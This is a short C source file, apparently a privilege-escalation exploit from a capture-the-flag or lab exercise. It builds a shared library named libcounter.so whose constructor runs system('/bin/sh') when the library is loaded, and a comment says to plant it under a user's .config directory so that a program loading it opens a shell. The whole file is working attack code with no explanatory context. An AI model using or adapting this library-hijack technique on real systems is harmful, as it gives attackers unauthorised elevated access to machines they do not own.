#include <stdio.h>

// gcc -fPIC -shared privesc.c -o libcounter.so
// place this library under => /home/rektsu/.config/libcounter.so

void __attribute__ ((constructor)) init(void){
    system("/bin/sh");
}

void hello() {};